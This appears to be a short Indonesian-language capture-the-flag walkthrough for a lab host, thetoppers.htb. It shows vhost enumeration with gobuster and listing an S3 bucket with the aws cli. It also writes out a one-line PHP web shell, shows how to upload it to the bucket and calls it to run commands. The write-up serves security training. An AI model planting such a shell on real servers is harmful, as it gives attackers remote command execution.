Setelah mengetahui bahwa port 80 terbuka, aku mencoba untuk mengakses halaman web tersebut di browser. Karena tidak menemukan informasi menarik pada halaman browser, aku mencoba untuk menggunakan gobuster dengan tujuan menemukan sub domain yang tersembunyi menggunakan mode vhost.

Setelah menjalankan gobuster mode vhost, aku menemukan sub-domain s3. Namun ketika diakses menggunakan browser, host tersebut tidak akan terbuka sampai aku menambahkannya ke /etc/hosts.

Gunakan aws cli dan jalankan aws configure dengan value terserah. Jalankan aws --endpoint=http://s3.thetoppers.htb s3 ls untuk melihat bucket apa saja yang tersedia pada URL tersebut. Jalankan aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb untuk melihat isi dari bucket thetoppers.htb

Buat web shell dengan value berikut <?php system($_GET["cmd"]); ?> lalu namakan shell.php yang nantinya akan kita upload ke s3 menggunakan command aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb. 

Akses http://thetoppers.htb/shell.php?cmd=pwd
